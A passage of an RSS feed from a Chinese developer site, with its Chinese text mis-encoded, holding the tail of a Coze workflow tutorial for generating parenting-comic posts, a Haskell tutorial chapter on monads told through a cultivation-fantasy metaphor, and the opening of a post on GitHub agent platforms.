<span class="hljs-bullet">  3.</span> é‡‡ç”¨å°çº¢ä¹¦å¸¸ç”¨çš„è¡¨è¾¾æ–¹å¼ï¼ŒåŒ…æ‹¬è¡¨æƒ…ç¬¦å·ã€åˆ†æ®µæ¸…æ™°ç­‰
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Output**</span>ï¼šå®Œæ•´çš„è‚²å„¿æ–‡æ¡ˆæ–‡æœ¬

<span class="hljs-section"># çº¦æŸä¸è§„åˆ™</span>
<span class="hljs-bullet">-</span> æ–‡æ¡ˆé•¿åº¦ï¼š100-500å­—å·¦å³
<span class="hljs-bullet">-</span> é£æ ¼ï¼šæ¸©é¦¨ã€äº²åˆ‡ã€æœ‰æ•™è‚²æ„ä¹‰
<span class="hljs-bullet">-</span> å¿…é¡»åŒ…å«ï¼šä¸»é¢˜ç›¸å…³çš„å®ç”¨å»ºè®®æˆ–è§‚ç‚¹
<span class="hljs-bullet">-</span> ä¸å¯ä»¥ä½¿ç”¨è¡¨æƒ…ç¬¦å·
<span class="hljs-bullet">-</span> é¿å…è¿‡äºå­¦æœ¯åŒ–çš„è¡¨è¾¾
<span class="hljs-bullet">-</span> æ–‡æ¡ˆè¦ç®€æ´æ˜äº†ï¼Œé€‚åˆåœ¨å›¾ç‰‡ä¸Šå±•ç¤º

<span class="hljs-section"># è¿‡ç¨‹</span>
<span class="hljs-bullet">1.</span> åˆ†æä¸»é¢˜å…³é”®è¯
<span class="hljs-bullet">2.</span> ç»“åˆè‚²å„¿åœºæ™¯æ’°å†™å†…å®¹
<span class="hljs-bullet">3.</span> åŠ å…¥å®ç”¨å»ºè®®å’Œæƒ…æ„Ÿå…±é¸£
<span class="hljs-bullet">4.</span> ä½¿ç”¨å°çº¢ä¹¦å¸¸è§çš„è¡¨è¾¾æ–¹å¼

<span class="hljs-section"># è¾“å‡ºæ ¼å¼</span>
ç›´æ¥è¿”å›æ–‡æ¡ˆæ–‡æœ¬ï¼Œä¸è¦æ·»åŠ å…¶ä»–è¯´æ˜æˆ–Markdownæ ¼å¼
</code></pre>
<h3 data-id="heading-4">2.3 è‚²å„¿æ–‡æ¡ˆå›¾ç‰‡ç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯ç”¨æ¥ç”Ÿæˆè‚²å„¿æ¼«ç”»å›¾æ–‡çš„ï¼Œæ¥æ”¶ä¸€ä¸ªè‚²å„¿æ–‡æ¡ˆä¸»é¢˜ï¼Œç„¶åç”Ÿæˆç›¸åº”çš„æ¼«ç”»å›¾æ–‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70279e2ab3ac4e57b9d54757eab88fe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=oJBJ3DxQgIdujLaTTN3v3FpPS2E%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªèŠ‚ç‚¹çœ‹ä¸åˆ°ç›¸åº”çš„ç”Ÿå›¾æ¨¡å‹å’Œæç¤ºè¯æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡é€šè¿‡ç¿»é˜…æºä»£ç å¯çœ‹åˆ°ä½¿ç”¨çš„ç”Ÿå›¾æ¨¡å‹æ˜¯Seedream4.5ï¼Œæç¤ºè¯è¿™äº›ä¹Ÿæ˜¯å†™åœ¨ä»£ç ä¸­äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0047ebbeb5684db9a06f59d8d59bcc02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=yFQFW42FCX4ue6PZjgNoyeJCpCM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.4 ç»“æŸ</h3>
<p>ç»“æŸèŠ‚ç‚¹å°±æ˜¯è¾“å‡ºäº†æœ€ç»ˆç”Ÿæˆçš„å›¾ç‰‡åˆ—è¡¨ï¼Œå¯ä»¥ç›´æ¥ç‚¹å¼€é¢„è§ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a69541d4fcf9480fa9b6c695d7bf2269~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=tEngNyzx%2FvUiZxcjwb%2BhSTwfy4Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">3. æ€»ç»“</h2>
<p>æ‰£å­ç¼–ç¨‹çœŸçš„æ˜¯è¶Šç”¨è¶Šä¸Šå¤´ï¼Œæ„Ÿè§‰æœ‰ç‚¹å„¿åœä¸ä¸‹æ¥ï¼Œç”¨AIæ¥æ’¸ç è¿™ä¸ªä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹ï¼Œä½†æ˜¯æ‰£å­ç¼–ç¨‹æŠŠè¿™ä¸ªå’Œå®ƒè‡ªå·±çš„ä¸šåŠ¡ç»“åˆèµ·æ¥ï¼Œç¡®å®æ˜¯è®©ä¸€ç›´åœ¨åšå·¥ä½œæµå¼€å‘çš„äººæ¿€åŠ¨ä¸å·²ã€‚</p>
<p>æœ¬æ–‡çš„åˆ†äº«å°±åˆ°è¿™é‡Œï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰æ”¶è·çš„è¯ï¼Œå¯ä»¥ç»™ä¸ªä¸€é”®ä¸‰è¿ï¼Œæ‚¨çš„é¼“åŠ±æ˜¯å¾é³´æŒç»­è¾“å‡ºçš„æœ€å¤§åŠ¨åŠ›ã€‚æœ‰ä»€ä¹ˆç–‘é—®ä¹Ÿå¯ä»¥æ‰“åœ¨è¯„è®ºåŒºï¼Œå¾é³´ä¼šç¬¬ä¸€æ—¶é—´å›å¤ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f87f93b100f54c52a6d21993ac692668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=FRv3Ga1SY0i2hs10jVnh%2BXJKGgk%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘å®æˆ˜äº†ä¸€äº›æ‰£å­ï¼ˆCozeï¼‰å·¥ä½œæµç›¸å…³çš„æ¡ˆä¾‹ï¼ŒåŒ…å«å°çº¢è–¯å›¾æ–‡ç”Ÿæˆã€çˆ†æ¬¾è§†é¢‘å‰ªè¾‘ã€åŠå…¬ææ•ˆç­‰æ‰£å­æ¡ˆä¾‹ï¼Œå†…é™„è¯¦ç»†çš„æ•™ç¨‹å’Œå·¥ä½œæµå®‰è£…åŒ…ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥æ¥ä¸ª<strong>ä¸€é”®ä¸‰è¿ï¼ˆå¿…é¡»åŠ¨ä½œï¼‰</strong> ï¼Œæ–‡ç« è¯„è®ºåŒºè¯„è®ºâ€œ<strong>æ‰£å­æ¡ˆä¾‹</strong>â€é¢†å–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ]]></title>    <link>https://juejin.cn/post/7589246131584794659</link>    <guid>https://juejin.cn/post/7589246131584794659</guid>    <pubDate>2025-12-30T02:41:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584794659" data-draft-id="7589186347585323042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:41:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:41:03.000Z" title="Tue Dec 30 2025 02:41:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬äº”ç« </strong>ã€‚å¦‚æœè¯´ä¹‹å‰çš„ç­‘åŸºä¸ç»“ä¸¹åªæ˜¯å¯¹â€œæœ¯â€çš„ç£¨ç»ƒï¼Œé‚£ä¹ˆè¿™ä¸€ç« ï¼Œæˆ‘ä»¬å°†æ­£å¼è¿æ¥ä¿®ä»™è·¯ä¸Šæœ€è‘—åçš„å¤©åŠ«â€”â€”<strong>å…ƒå©´æœŸï¼šMonadï¼ˆå•å­ï¼‰æ‚Ÿé“</strong>ã€‚</p>
<p>åœ¨ Î» é—¨çš„ä¼ è¯´ä¸­ï¼Œæœ‰è¿™æ ·ä¸€å¥è¯ï¼šâ€œMonad æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå•å­å¯¹è±¡ï¼Œè¿™æœ‰ä»€ä¹ˆéš¾ç†è§£çš„ï¼Ÿâ€â€”â€”è¿™å°±æ˜¯è‘—åçš„**â€œå…ƒå©´æœŸå¿ƒé­”â€**ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬ä¸è°ˆæ¯ç‡¥çš„èŒƒç•´è®ºï¼Œåªè°ˆå¦‚ä½•é©¾é©­å®ƒã€‚</p>
<hr/>
<p>åœ¨çº¯ç²¹çš„ Haskell ä¸–ç•Œé‡Œï¼Œå‡½æ•°æ˜¯æå…¶â€œå­¤å‚²â€çš„ï¼Œå®ƒä»¬ä¸å‡†è§¦ç¢°å°˜ä¸–ï¼ˆå‰¯ä½œç”¨ï¼‰ï¼Œä¸å‡†äº§ç”Ÿæ„å¤–ã€‚ä½†åœ¨å®æˆ˜ä¸­ï¼Œä½ æ€»ä¼šé‡åˆ°ï¼š</p>
<ol>
<li><strong>ä¸ç¡®å®šæ€§ï¼š</strong> è¿™æ¬¡ç‚¼ä¸¹å¯èƒ½ä¼šç‚¸ç‚‰ï¼ˆ<code>Maybe</code>ï¼‰ã€‚</li>
<li><strong>å¤šé‡å› æœï¼š</strong> ä¸€ä¸ªå’’è¯­å¯èƒ½å¹»åŒ–å‡ºå¤šä¸ªåˆ†èº«ï¼ˆ<code>List</code>ï¼‰ã€‚</li>
<li><strong>å‡¡å°˜äº¤äº’ï¼š</strong> ä½ éœ€è¦è¯»å–è¯»è€…çš„ç¥è¯†æˆ–åœ¨çŸ³ç¢‘ä¸Šåˆ»å­—ï¼ˆ<code>IO</code>ï¼‰ã€‚</li>
</ol>
<p><strong>Monad</strong>ï¼Œå°±æ˜¯ä¸ºäº†å¤„ç†è¿™äº›â€œå¸¦æœ‰é¢å¤–æ°”æ¯â€çš„ä»·å€¼è€Œå­˜åœ¨çš„<strong>é«˜çº§æ³•é˜µ</strong>ã€‚</p>
<h3 data-id="heading-0">5.1 æ³•é˜µçš„æ ¸å¿ƒï¼šå¸¦ç€â€œä¸Šä¸‹æ–‡â€çš„ç›’å­</h3>
<p>ä½ å¯ä»¥æŠŠ Monad çœ‹ä½œä¸€ä¸ª<strong>ç¥å¥‡çš„ç›’å­ï¼ˆContextï¼‰</strong> ã€‚</p>
<ul>
<li><code>a</code> æ˜¯ç›’å­é‡Œçš„å®è´ï¼ˆçº¯å‡€çš„å€¼ï¼‰ã€‚</li>
<li><code>m a</code> åˆ™æ˜¯è¢«æ³•é˜µåŒ…è£¹ç€çš„å®è´ã€‚</li>
</ul>
<h3 data-id="heading-1">5.2 æ ¸å¿ƒç§˜ç±ï¼šç»‘å®šè¿ç®—ç¬¦ <code>&gt;&gt;=</code> (Bind)</h3>
<p>åœ¨å‡¡é—´ï¼Œä½ å¯èƒ½ä¼šå†™ï¼šy = f(x); z = g(y)ã€‚</p>
<p>ä½†åœ¨ Monad é˜µæ³•é‡Œï¼Œå› ä¸ºå€¼è¢«åŒ…è£¹åœ¨ç›’å­é‡Œï¼Œä½ æ²¡æ³•ç›´æ¥æŠŠå®ƒå–‚ç»™ä¸‹ä¸€ä¸ªå‡½æ•°ã€‚è¿™æ—¶ä½ éœ€è¦ &gt;&gt;=ï¼ˆç»‘å®šï¼‰ï¼š</p>
<blockquote>
<p><strong>å¿ƒæ³•ï¼š</strong> å®ƒä¼šå¸®ä½ æ‰“å¼€å½“å‰çš„ç›’å­ï¼Œå–å‡ºå®è´ï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªæ³•æœ¯å¤„ç†ï¼Œå¤„ç†å®Œåå†æŠŠç»“æœå¦¥å–„åœ°æ”¾å›æ–°ç›’å­é‡Œã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">5.3 ç¬¬ä¸€å°Š Monadï¼šMaybeï¼ˆè™šå®ä¹‹é“ï¼‰</h3>
<p>è¿™æ˜¯æœ€é€‚åˆæ„Ÿæ‚Ÿ Monad çš„é˜µæ³•ã€‚å®ƒå¤„ç†çš„æ˜¯**â€œå¯èƒ½å¤±è´¥â€**çš„å› æœã€‚</p>
<ul>
<li><code>Just a</code>ï¼šç»ƒæˆäº†ï¼Œç›’å­é‡Œæœ‰å®è´ã€‚</li>
<li><code>Nothing</code>ï¼šç‚¸ç‚‰äº†ï¼Œç›’å­é‡Œç©ºæ— ä¸€ç‰©ã€‚</li>
</ul>
<p>æ¼”ç»ƒï¼šè¿ç»­ç‚¼ä¸¹</p>
<p>å‡è®¾æœ‰ä¸‰ä¸ªæ³•æœ¯ï¼Œæ¯ä¸ªéƒ½æœ‰å‡ ç‡å¤±è´¥ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- å¦‚æœæ²¡æœ‰ Monadï¼Œä½ å¾—å†™æ— æ•°å±‚ if-else</span>
<span class="hljs-comment">-- æœ‰äº† Monadï¼Œå› æœä¼šè‡ªåŠ¨ä¼ é€’</span>
attemptAlchemy :: Material -&gt; Maybe Gold
attemptAlchemy m = 
    refine m &gt;&gt;=        <span class="hljs-comment">-- æç‚¼ï¼Œå¯èƒ½å¤±è´¥</span>
    crystallize &gt;&gt;=     <span class="hljs-comment">-- ç»“æ™¶ï¼Œå¯èƒ½å¤±è´¥</span>
    enchant             <span class="hljs-comment">-- é™„é­”ï¼Œå¯èƒ½å¤±è´¥</span>
</code></pre>
<p><strong>ç¥æ•ˆï¼š</strong> åªè¦å…¶ä¸­ä»»ä½•ä¸€æ­¥å˜æˆ <code>Nothing</code>ï¼ˆç‚¸ç‚‰ï¼‰ï¼Œåç»­æ‰€æœ‰çš„ <code>&gt;&gt;=</code> éƒ½ä¼šç›´æ¥è·³è¿‡ï¼Œæœ€ç»ˆç»“æœè‡ªåŠ¨å˜æˆ <code>Nothing</code>ã€‚è¿™å«**â€œä¸€è£ä¿±è£ï¼Œä¸€æŸä¿±æŸâ€**ã€‚</p>
<hr/>
<h3 data-id="heading-3">5.4 ç®€åŒ–å’’è¯­ï¼šDo-Notationï¼ˆçœŸè¨€æœ¯ï¼‰</h3>
<p>ä¸ºäº†è®©ä¿®ä»™è€…å†™ä»£ç æ›´é¡ºæ‰‹ï¼Œå¤©é“èµä¸‹äº† <strong><code>do</code> è®°æ³•</strong>ã€‚å®ƒè®© Monad çš„æ“ä½œçœ‹èµ·æ¥åƒå‡¡é—´çš„é¡ºåºæ‰§è¡Œï¼Œä½†å†…æ ¸ä¾ç„¶ä¿æŒçº¯ç²¹ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- ä¸Šé¢çš„ç‚¼ä¸¹è¿‡ç¨‹å¯ä»¥å†™æˆï¼š</span>
alchemyInDo m = <span class="hljs-keyword">do</span>
    refined &lt;- refine m       <span class="hljs-comment">-- ä»ç›’å­é‡Œå–å‡ºå®è´</span>
    crystal &lt;- crystallize refined
    enchant crystal           <span class="hljs-comment">-- æœ€åä¸€å‡»ï¼Œç•™åœ¨ç›’å­é‡Œ</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">5.5 æœ€å±é™©çš„é˜µæ³•ï¼šIO Monad</h3>
<p>åœ¨ Haskell ä¸­ï¼Œæ‰€æœ‰ä¸ç°å®ä¸–ç•Œçš„äº¤äº’ï¼ˆè¯»å†™æ–‡ä»¶ã€æ§åˆ¶å°è¾“å‡ºï¼‰éƒ½è¢«å›šç¦åœ¨ <code>IO</code> è¿™ä¸ªå¤§é˜µä¸­ã€‚</p>
<ul>
<li>ä½ ä¸èƒ½ä» <code>IO String</code> é‡ŒæŠŠ <code>String</code> æ°¸ä¹…å–å‡ºæ¥å˜æˆçº¯ç²¹çš„ <code>String</code>ã€‚</li>
<li>ä¸€æ—¦ä½ æŸ“æŒ‡äº†å‡¡å°˜ï¼ˆIOï¼‰ï¼Œä½ çš„æ•´ä¸ªæ³•æœ¯åºåˆ—éƒ½ä¼šè¢«æ‰“ä¸Š <code>IO</code> çš„çƒ™å°ã€‚</li>
</ul>
<p>è¿™ä¿è¯äº†**â€œä»™å‡¡æœ‰åˆ«â€**ï¼šçº¯ç²¹çš„é€»è¾‘æ°¸è¿œä¸ä¼šè¢«å¤šå˜çš„ç°å®ä¸–ç•Œæ‰€æ±¡æŸ“ã€‚</p>
<hr/>
<h2 data-id="heading-5">ğŸ“œ å…ƒå©´è¯•ç‚¼ï¼šç¬¬äº”å…³</h2>
<p>è¯·åœ¨ä½ çš„é¼ç‚‰ä¸­å¸ƒç½®ä¸€ä¸ªç®€å•çš„ <code>Maybe</code> æ³•é˜µï¼š</p>
<ol>
<li>
<p><strong>å®šä¹‰ä¸¤ä¸ªæ³•æœ¯ï¼š</strong></p>
<ul>
<li><code>half :: Int -&gt; Maybe Int</code>ï¼šå¦‚æœæ˜¯å¶æ•°ï¼Œè¿”å›ä¸€åŠï¼›å¦‚æœæ˜¯å¥‡æ•°ï¼Œè¿”å› <code>Nothing</code>ï¼ˆç‚¸ç‚‰ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é“¾å¼æ–½æ³•ï¼š</strong> ä½¿ç”¨ <code>&gt;&gt;=</code> æˆ– <code>do</code> è®°æ³•ï¼Œå°è¯•å°†æ•°å­— <code>20</code> è¿ç»­è¿›è¡Œä¸‰æ¬¡ <code>half</code> æ“ä½œã€‚</p>
<ul>
<li>è¾“å…¥ <code>20</code> æ—¶ï¼Œç»“æœåº”è¯¥æ˜¯ï¼Ÿ</li>
<li>è¾“å…¥ <code>18</code> æ—¶ï¼Œç»“æœåº”è¯¥æ˜¯ï¼Ÿï¼ˆæç¤ºï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn><mo>â†’</mo><mn>9</mn><mo>â†’</mo></mrow><annotation encoding="application/x-tex">18 \to 9 \to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">18</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">9</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span></span></span></span></span> ç‚¸ç‚‰ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>â€œå½“ä½ æ˜ç™½äº† Monad ä¸æ˜¯ä¸ºäº†è®©ç®€å•å˜å¤æ‚ï¼Œè€Œæ˜¯ä¸ºäº†è®©å¤æ‚çš„å› æœå˜å¾—æ¸…æ™°å¯æ§æ—¶ï¼Œä½ ä¾¿å·²ç ´å…¥å…ƒå©´ï¼Œç¥è¯†ä¸ç­ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> æ­å–œé“å‹ï¼å…ƒå©´å·²æˆã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†è¿æ¥ä¿®ä»™ç•Œçš„æœ€é«˜è£èª‰â€”â€”<strong>åŒ–ç¥æœŸï¼šFunctor (å‡½å­) ä¸ Applicative (åº”ç”¨å‡½å­)</strong> ã€‚ä½ å°†å­¦ä¼šå¦‚ä½•åœ¨ä¸æ‰“å¼€ç›’å­çš„æƒ…å†µä¸‹ï¼Œéš”ç©ºæ“æ§ç›’å†…çš„æ³•å®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚]]></title>    <link>https://juejin.cn/post/7589176150493741110</link>    <guid>https://juejin.cn/post/7589176150493741110</guid>    <pubDate>2025-12-30T02:40:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589176150493741110" data-draft-id="7589176150493593654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-30T02:40:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚
